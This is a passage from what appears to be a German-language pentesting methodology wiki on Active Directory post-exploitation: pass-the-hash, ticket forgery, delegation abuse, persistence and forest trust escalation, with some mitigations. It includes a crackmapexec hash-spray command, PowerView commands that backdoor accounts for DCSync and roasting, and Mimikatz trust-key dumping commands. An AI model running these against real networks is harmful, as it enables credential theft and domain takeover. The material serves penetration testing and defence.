Hoffentlich ist es dir gelungen, mithilfe von [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) und [lokaler Privilege escalation](../windows-local-privilege-escalation/index.html) ein **lokales Administratorkonto zu kompromittieren**.\
Dann ist es an der Zeit, alle Hashes aus dem Speicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Möglichkeiten, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um den Benutzer zu **imitieren**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mithilfe** dieses **Hashes durchführt**, oder du könntest eine neue **sessionlogon** erstellen und diesen **Hash** in **LSASS injizieren**, sodass bei jeder durchgeführten **NTLM-Authentifizierung dieser Hash verwendet wird.** Die letzte Option wird von mimikatz verwendet.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum herkömmlichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **in Netzwerken nützlich sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos als Authentifizierungsprotokoll zulässig ist**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers** anstelle seines Passworts oder seiner Hash-Werte. Dieses gestohlene Ticket wird anschließend verwendet, um den **Benutzer zu imitieren** und unbefugten Zugriff auf Ressourcen und Services innerhalb eines Netzwerks zu erlangen.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrato**r hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** dies **eindämmen** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer über Berechtigungen zum **Zugriff auf MSSQL-Instanzen** verfügt, könnte er diese verwenden, um **Befehle** auf dem MSSQL-Host **auszuführen** (wenn dieser als SA läuft), den NetNTLM-**Hash zu stehlen** oder sogar einen **Relay**-**Angriff** durchzuführen.\
Außerdem kann eine MSSQL-Instanz von einer anderen MSSQL-Instanz als vertrauenswürdig eingestuft werden (Datenbank-Link). Wenn der Benutzer Berechtigungen für die vertrauenswürdige Datenbank besitzt, kann er die **Vertrauensbeziehung verwenden, um Abfragen auch in der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden, sodass der Benutzer möglicherweise eine fehlkonfigurierte Datenbank findet, in der er Befehle ausführen kann.\
**Die Verbindungen zwischen Datenbanken funktionieren auch über Forest Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuse von IT-Asset-/Deployment-Plattformen

Drittanbieter-Inventarisierungs- und Deployment-Suites bieten häufig mächtige Wege zu Zugangsdaten und Code Execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und über Domain-Berechtigungen auf dem Computer verfügst, kannst du die TGTs aller Benutzer aus dem Arbeitsspeicher auslesen, die sich am Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du dessen TGT auslesen und ihn mithilfe von [Pass the Ticket](pass-the-ticket.md) imitieren.\
Dank Constrained Delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" zugelassen ist, kann er **jeden Benutzer imitieren, um auf bestimmte Services eines Computers zuzugreifen**.\
Wenn du anschließend den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer** (einschließlich Domain Admins) imitieren, um auf bestimmte Services zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Wenn du über das **WRITE**-Recht für ein Active-Directory-Objekt eines Remote-Computers verfügst, kannst du Code Execution mit **erhöhten Berechtigungen** erlangen:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuse von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte **interessante Berechtigungen für bestimmte Domain-Objekte** besitzen, die es dir ermöglichen, dich später **lateral zu bewegen**/**Berechtigungen zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuse des Printer-Spooler-Service

Wenn du einen **Spool-Service entdeckst, der innerhalb der Domain lauscht**, kann dieser **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuse von Sessions Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, ist es möglich, **Zugangsdaten aus dem Arbeitsspeicher zu sammeln** und sogar Beacons in ihre Prozesse **zu injizieren**, um sie zu imitieren.\
Üblicherweise greifen Benutzer über RDP auf das System zu. Daher wird hier beschrieben, wie einige Angriffe auf RDP-Sessions Dritter durchgeführt werden:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-joined Computern bereit und stellt sicher, dass dieses **randomisiert**, einzigartig und regelmäßig **geändert** wird. Diese Passwörter werden im Active Directory gespeichert, und der Zugriff wird über ACLs ausschließlich für autorisierte Benutzer kontrolliert. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter wird ein Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** vom kompromittierten Computer kann eine Möglichkeit sein, Berechtigungen innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuse von Certificate Templates

Wenn **verwundbare Templates** konfiguriert sind, können diese missbraucht werden, um Berechtigungen zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-Exploitation mit einem Konto mit hohen Berechtigungen

### Dumping von Domain-Credentials

Sobald du **Domain-Admin**- oder noch besser **Enterprise-Admin**-Berechtigungen erlangt hast, kannst du die **Domain-Datenbank** _ntds.dit_ **dumpen**.

[**Weitere Informationen zum DCSync-Angriff findest du hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc als Persistence

Einige der zuvor beschriebenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer für [**ASREPRoast**](asreproast.md) verwundbar machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Einem Benutzer [**DCSync**](#dcsync)-Berechtigungen gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver-Ticket-Angriff** erstellt mithilfe des **NTLM-Hashes** (beispielsweise des **Hashes des PC-Kontos**) ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Service. Diese Methode wird verwendet, um auf die **Berechtigungen des Services zuzugreifen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden-Ticket-Angriff** erlangt ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active-Directory-(AD-)Umgebung. Dieses Konto ist besonders wichtig, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung innerhalb des AD-Netzwerks erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erstellen (Silver-Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese ähneln Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence von Zertifikatskonten**

**Der Besitz von Zertifikaten eines Kontos oder die Möglichkeit, diese anzufordern**, ist eine sehr gute Möglichkeit, Persistence im Benutzerkonto zu gewährleisten (selbst wenn der Benutzer sein Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence von Zertifikatsdomains**

**Mithilfe von Zertifikaten ist es ebenfalls möglich, Persistence mit hohen Berechtigungen innerhalb der Domain zu erreichen:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory gewährleistet die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardmäßige **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden: Wenn ein Angreifer die ACL des AdminSDHolder so ändert, dass ein regulärer Benutzer vollständigen Zugriff erhält, erlangt dieser Benutzer umfassende Kontrolle über alle privilegierten Gruppen. Diese eigentlich zum Schutz gedachte Sicherheitsmaßnahme kann somit nach hinten losgehen und unberechtigten Zugriff ermöglichen, sofern sie nicht genau überwacht wird.

[**Weitere Informationen zur AdminDSHolder Group findest du hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administratorkonto**. Wenn du Administratorrechte auf einem solchen Computer erlangst, kannst du den Hash des lokalen Administrators mithilfe von **mimikatz** extrahieren. Anschließend ist eine Registry-Änderung erforderlich, um **die Verwendung dieses Passworts zu aktivieren** und dadurch Remotezugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** bestimmte **spezielle Berechtigungen** für bestimmte Domain-Objekte **gewähren**, die es dem Benutzer ermöglichen, in Zukunft **Berechtigungen zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden verwendet, um die **Berechtigungen zu speichern**, die ein **Objekt für ein anderes Objekt** besitzt. Wenn du lediglich eine **kleine Änderung** am **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Berechtigungen für dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die zusätzliche Klasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Diese löschen sich selbst ohne Tombstones und entfernen dadurch LDAP-Spuren, hinterlassen jedoch verwaiste SIDs, defekte `gPLink`-Referenzen oder gecachte DNS-Antworten (z. B. eine Verschmutzung der AdminSDHolder-ACE oder schädliche `gPCFileSysPath`-/AD-integrierte DNS-Redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domain-Konten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfährst du, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Credentials** im **Klartext zu erfassen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** in der AD registriert und verwendet, um **Attribute** (SIDHistory, SPNs usw.) auf bestimmten Objekten zu **setzen**, ohne **Logs** über die **Änderungen** zu hinterlassen. Du **benötigst DA**-Berechtigungen und musst dich innerhalb der **Root-Domain** befinden.\
Beachte, dass bei der Verwendung falscher Daten äußerst unschöne Logs erscheinen.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Zuvor wurde beschrieben, wie Berechtigungen eskaliert werden können, wenn du **über ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern verfügst**. Diese Passwörter können jedoch auch verwendet werden, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass die **Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domain** den Zugriff auf Ressourcen in einer anderen **Domain** ermöglicht. Er stellt im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains her, sodass Authentifizierungsprüfungen nahtlos weitergeleitet werden können. Wenn Domains einen Trust einrichten, tauschen sie bestimmte **Keys** aus und speichern diese in ihren **Domain Controllern (DCs)**. Diese sind entscheidend für die Integrität des Trusts.

In einem typischen Szenario muss ein Benutzer, der auf einen Service in einer **trusted Domain** zugreifen möchte, zunächst ein spezielles Ticket namens **Inter-Realm TGT** beim DC seiner eigenen Domain anfordern. Dieses TGT wird mit einem gemeinsamen **Key** verschlüsselt, auf den sich beide Domains geeinigt haben. Anschließend übergibt der Benutzer dieses TGT an den **DC der trusted Domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des Inter-Realm TGT durch den DC der trusted Domain stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Service gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** beginnt den Vorgang, indem er seinen **NTLM-Hash** verwendet, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert anschließend ein **Inter-Realm TGT** von DC1 an, das für den Zugriff auf Ressourcen in **Domain 2** benötigt wird.
4. Das Inter-Realm TGT wird mit einem **Trust-Key** verschlüsselt, der im Rahmen des bidirektionalen Domain Trusts zwischen DC1 und DC2 geteilt wird.
5. Der Client übergibt das Inter-Realm TGT an den **Domain Controller (DC2) von Domain 2**.
6. DC2 überprüft das Inter-Realm TGT mithilfe des gemeinsamen Trust-Keys und stellt, falls es gültig ist, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich übergibt der Client dieses TGS an den Server. Das TGS ist mit dem Account-Hash des Servers verschlüsselt und ermöglicht den Zugriff auf den Service in Domain 2.

### Verschiedene Trusts

Es ist wichtig zu beachten, dass **ein Trust unidirektional oder bidirektional** sein kann. Bei der bidirektionalen Variante vertrauen beide Domains einander. Bei einer **unidirektionalen** Trust-Beziehung ist eine Domain die **trusted** und die andere die **trusting** Domain. In letzterem Fall kannst du **nur von der trusted Domain aus auf Ressourcen innerhalb der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted Domain. Außerdem handelt es sich in **Domain A** um einen **Outbound Trust** und in **Domain B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist eine häufige Konfiguration innerhalb desselben Forests, bei der eine Child-Domain automatisch einen transitiven bidirektionalen Trust mit ihrer Parent-Domain besitzt. Das bedeutet im Wesentlichen, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child weitergeleitet werden können.
- **Cross-Link Trusts**: Diese werden als "Shortcut Trusts" bezeichnet und zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals normalerweise bis zur Forest-Root und anschließend zurück zur Ziel-Domain weitergeleitet werden. Durch Cross-Links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht miteinander verbundenen Domains eingerichtet und sind von Natur aus nicht transitiv. Laut [Microsofts Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht über einen Forest Trust verbunden ist. Die Sicherheit wird durch SID Filtering bei External Trusts verbessert.
- **Tree-Root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einer neu hinzugefügten Tree-Root eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-Root Trusts wichtig, um neue Domain-Bäume zu einem Forest hinzuzufügen. Sie ermöglichen diesen, einen eindeutigen Domain-Namen beizubehalten, und gewährleisten Bidirektionalität. Weitere Informationen findest du im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein transitiver bidirektionaler Trust zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID Filtering, um die Sicherheitsmaßnahmen zu verbessern.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domains eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind etwas spezialisierter und für Umgebungen gedacht, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems benötigen.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, also vertraut A C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **unidirektionaler Trust** (nur eine Domain vertraut der anderen) eingerichtet werden.

### Angriffspfad

1. Die Trust-Beziehungen **enumerieren**
2. Prüfe, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domain** besitzt, beispielsweise durch ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domain. Suche nach **Beziehungen zwischen Domains** (der Trust wurde vermutlich genau dafür eingerichtet).
1. Kerberoast könnte in diesem Fall eine weitere Option sein.
3. Kompromittiere die **Konten**, die ein **Pivoting** zwischen Domains ermöglichen.

Angreifer mit Zugriff auf Ressourcen in einer anderen Domain können diesen über drei primäre Mechanismen erlangen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können lokalen Gruppen auf Computern hinzugefügt werden, beispielsweise der Gruppe „Administrators“ auf einem Server, wodurch sie weitreichende Kontrolle über diesen Computer erhalten.
- **Mitgliedschaft in Gruppen einer fremden Domain**: Principals können auch Mitglied von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** angegeben sein, insbesondere als Entitäten in **ACEs** innerhalb einer **DACL**, wodurch ihnen Zugriff auf bestimmte Ressourcen gewährt wird. Wer sich eingehender mit der Funktionsweise von ACLs, DACLs und ACEs beschäftigen möchte, findet im Whitepaper „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ eine wertvolle Ressource.<sup>[[17]](#references)</sup>

### Externe Benutzer/Gruppen mit Berechtigungen finden

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um Foreign Security Principals in der Domain zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domain/einem externen Forest**.

Du kannst dies in **Bloodhound** oder mithilfe von powerview überprüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent-Rechteausweitung in einer Gesamtstruktur
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten zur Aufzählung von Domain-Trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Sie können den vom aktuellen Domain verwendeten Schlüssel mit folgenden Befehlen auslesen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin zur Child-/Parent-Domäne eskalieren, indem der Trust mit SID-History Injection missbraucht wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Ausnutzung einer beschreibbaren Configuration NC

Es ist entscheidend zu verstehen, wie die Configuration Naming Context (NC) ausgenutzt werden kann. Die Configuration NC dient in Active-Directory-(AD-)Umgebungen als zentrales Repository für Konfigurationsdaten im gesamten Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forests repliziert, wobei beschreibbare DCs eine beschreibbare Kopie der Configuration NC verwalten. Um dies auszunutzen, benötigt man **SYSTEM-Berechtigungen auf einem DC**, vorzugsweise auf einem Child-DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container der Configuration NC enthält Informationen zu den Sites aller domänenverbundenen Computer innerhalb des AD-Forests. Mit SYSTEM-Berechtigungen auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch kann die Root-Domäne kompromittiert werden, indem die auf diese Sites angewendeten Richtlinien manipuliert werden.

Für ausführliche Informationen kann die Forschung zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) herangezogen werden.<sup>[[12]](#references)</sup>

**Beliebige gMSA im Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domäne anzugreifen. Der KDS Root Key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM-Berechtigungen auf einem beliebigen DC ist es möglich, auf den KDS Root Key zuzugreifen und die Passwörter beliebiger gMSAs im gesamten Forest zu berechnen.

Eine detaillierte Analyse und schrittweise Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender delegierter MSA-Angriff (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Change-Angriff**

Diese Methode erfordert Geduld, da auf die Erstellung neuer privilegierter AD-Objekte gewartet werden muss. Mit SYSTEM-Berechtigungen kann ein Angreifer das AD-Schema ändern, um beliebigen Benutzern vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unbefugtem Zugriff auf neu erstellte AD-Objekte und deren Kontrolle führen.

Weitere Informationen finden sich unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Objekte der Public Key Infrastructure (PKI) ab, um ein Certificate Template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb des Forests ermöglicht. Da sich PKI-Objekte in der Configuration NC befinden, ermöglicht die Kompromittierung eines beschreibbaren Child-DCs die Ausführung von ESC5-Angriffen.

Weitere Details finden sich unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Wenn kein ADCS vorhanden ist, kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domäne – Einseitig (Inbound) oder bidirektional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **Ihrer Domäne von einer externen Domäne vertraut**, wodurch Sie **nicht näher bestimmte Berechtigungen** für diese erhalten. Sie müssen herausfinden, **welche Principals Ihrer Domäne über welchen Zugriff auf die externe Domäne verfügen**, und anschließend versuchen, diesen Zugriff auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne – Einseitig (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario **vertraut deine Domäne** einem Principal aus **einer anderen Domäne** bestimmte **Berechtigungen** an.

Wenn jedoch eine **Domäne von der vertrauenden Domäne** als vertrauenswürdig eingestuft wird, **erstellt die vertrauenswürdige Domäne** einen Benutzer mit einem **vorhersehbaren Namen**, der als **Passwort das Passwort der vertrauenswürdigen Domäne** verwendet. Dadurch ist es möglich, **auf einen Benutzer aus der vertrauenden Domäne zuzugreifen, um in die vertrauenswürdige Domäne einzudringen**, sie zu enumerieren und zu versuchen, weitere Berechtigungen zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in die **entgegengesetzte Richtung** des Domänenvertrauens erstellt wurde, was nicht sehr häufig vorkommt.

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einer Maschine zu warten, auf die sich ein **Benutzer aus der vertrauenswürdigen Domäne zugreifen** kann, um sich per **RDP** anzumelden. Anschließend könnte der Angreifer Code in den Prozess der RDP-Sitzung injizieren und von dort aus **auf die Ursprungsdomäne des Opfers zugreifen**.\
Wenn der **Benutzer seine Festplatte eingebunden hat**, könnte der Angreifer außerdem über den Prozess der **RDP-Sitzung** **Backdoors** im **Startup-Ordner der Festplatte** speichern. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen zur Verhinderung von Domain trust abuse

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-history-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering reduziert, das standardmäßig für alle Inter-Forest Trusts aktiviert ist. Dies basiert auf der Annahme, dass Intra-Forest Trusts sicher sind, wobei gemäß Microsofts Auffassung der Forest und nicht die Domäne die Sicherheitsgrenze darstellt.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest Trusts stellt die Verwendung von Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domänen und Server innerhalb der vertrauenden Domäne oder des vertrauenden Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

